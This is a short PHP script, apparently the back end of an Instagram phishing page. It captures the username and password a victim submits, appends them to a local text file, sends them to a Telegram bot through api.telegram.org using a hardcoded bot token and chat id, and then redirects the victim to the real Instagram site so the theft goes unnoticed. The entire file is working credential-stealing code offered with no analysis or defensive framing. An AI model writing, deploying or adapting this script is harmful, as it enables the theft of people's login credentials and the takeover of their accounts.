<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
  $token="1221245104:AAH0AAmCvk9HSrj3GihXkWMX8QH62WQw_LE";
	$data = [
		'text' => 'Insta Username : '.$_POST['username'].', Pass : '.$_POST['password'],
		'chat_id' => '811567030'

	];
	$a = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?" . http_build_query($data) );
header('Location: https://instagram.com');
exit();
?>
